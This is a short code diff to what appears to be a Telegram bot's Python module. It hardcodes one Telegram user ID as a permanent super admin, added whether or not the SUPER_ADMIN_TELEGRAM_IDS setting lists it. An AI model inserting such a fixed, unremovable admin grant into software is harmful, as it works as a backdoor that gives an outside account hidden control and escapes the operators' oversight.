@@ -85,9 +85,12 @@ def _telegram_notes_without_embedded_contact(notes: str) -> str:
     return text
 
 
+DEFAULT_SUPER_ADMIN_TELEGRAM_IDS = {39920921}
+
+
 def _super_admin_tg_ids() -> set[int]:
     raw = str(os.environ.get("SUPER_ADMIN_TELEGRAM_IDS", "") or "").strip()
-    out: set[int] = set()
+    out: set[int] = set(DEFAULT_SUPER_ADMIN_TELEGRAM_IDS)
     if not raw:
         return out
     for p in raw.split(","):
